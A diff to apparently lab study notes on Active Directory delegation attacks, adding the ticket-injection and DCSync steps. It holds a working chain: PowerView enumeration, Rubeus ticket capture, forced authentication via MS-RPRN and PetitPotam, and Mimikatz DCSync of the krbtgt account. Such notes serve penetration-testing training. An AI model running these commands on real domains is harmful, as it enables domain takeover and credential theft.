@@ -76,11 +76,11 @@ to any service on any computer in the domain.
 When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in LSASS. 
 This way the server can reuse the user's TGT to access any other resource as the user
 
-<b>::: Discover domain computers which have unconstrained delegation enabled usingPowerView</b>
+<b>::: DISCOVER DOMAIN COMPUTERS WHICH HAVE UNCONSTRAINED DELEGATION ENABLED USING POWERVIEW</b>
 
 PS> Get-DomainComputer -UnConstrained
 
-<b>::: USING ActiveDirectory MODULE</b>
+<b>::: USING Active Directory MODULE</b>
 
 PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
 
@@ -102,17 +102,31 @@ PS> Invoke-Mimikatz -Command '"kerberos::pttC:\Users\appadmin\Documents\user1\[0
 A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to 
 connect to second a machine of the domain user's choice.
 
-We can capture the TGT of dcorp-dc$ by using Rubeus (https://github.com/GhostPack/Rubeus) on dcorp-appsrv
+<b> CAPTURE THE TGT OF dcorp-dc$ BY USING RUBEUS ON dcorp-appsrv</b>
+
+reference: (https://github.com/GhostPack/Rubeus) 
 
 PS> Rubeus.exe monitor /interval:5 /nowrap
 
-And after that run MS-RPRN.exe (https://github.com/leechristensen/SpoolSample) on the student VM
+...and after that run MS-RPRN.exe on the student VM.
+
+reference: (https://github.com/leechristensen/SpoolSample) 
 
 PS> MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local  \\dcorp-appsrv.dollarcorp.moneycorp.local
 
+<b> COPY THE base64 ENCODED TGT, REMOVE EXTRA SPACES (if any) AND USE IT ON THE STUDENT VM</b>
+
+PS> Rubeus.exe ptt /tikcet:
+
+<b> ONCE THE TICKET IS INJECTED, RUN DCSync</b>
+
+PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+
 <b>::: PETIPOTAM</b>
 
-We can also use PetitPotam.exe (https://github.com/topotam/PetitPotam) on dcorp-appsrv
+<b> We can also use PetitPotam.exe on dcorp-appsrv</b>
+
+reference: (https://github.com/topotam/PetitPotam) 
 
 PS> PetitPotam.exe dcorp-appsrv dcorp-dc
 
@@ -120,12 +134,13 @@ On dcorp-appsrv
 
 PS> Rubeus.exe monitor /interval:5
 
-""PetitPotamuses EfsRpcOpenFileRawfunction of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't 
-need credentials when used against a DC""
+"PetitPotam uses EfsRpcOpenFileRaw function of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't 
+need credentials when used against a DC"
  
 CONSTRAINED DELEGATION: which allows the first hop server (web server in our example) to request access only to 
 specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first 
 hop server, Windows offers Protocol Transition to transition the request to Kerberos
+
 
 
 
